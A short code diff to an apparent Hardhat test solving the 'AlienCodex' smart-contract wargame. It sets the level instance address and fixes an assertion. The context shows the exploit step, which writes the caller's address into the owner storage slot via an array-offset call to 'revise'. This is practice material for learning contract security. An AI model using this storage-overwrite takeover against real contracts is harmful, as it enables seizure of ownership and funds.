@@ -9,7 +9,7 @@ let eoa: Signer;
 let attacker: Contract;
 let challenge: Contract;
 const LEVEL_ADDRESS = "0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272";
-const INSTANCIA_DEL_NIVEL: string = "";
+const INSTANCIA_DEL_NIVEL: string = "0xa1553Bd7D78Fd5AE03370092afF964f60A713b22";
 
 before(async () => {
   accounts = await ethers.getSigners();
@@ -52,7 +52,7 @@ describe("AlienCodex challenge", async()=> {
     let txCambiarOwner = await challenge.revise(offsetParaLlegarAOwner, ethers.utils.zeroPad(myAddress,32));
     await txCambiarOwner.wait();
 
-    expect(await challenge.owner(),"OWNER NO ALTERADO").to.be(myAddress);
+    expect(await challenge.owner(),"OWNER NO ALTERADO").to.equal(myAddress);
   })
 });
 
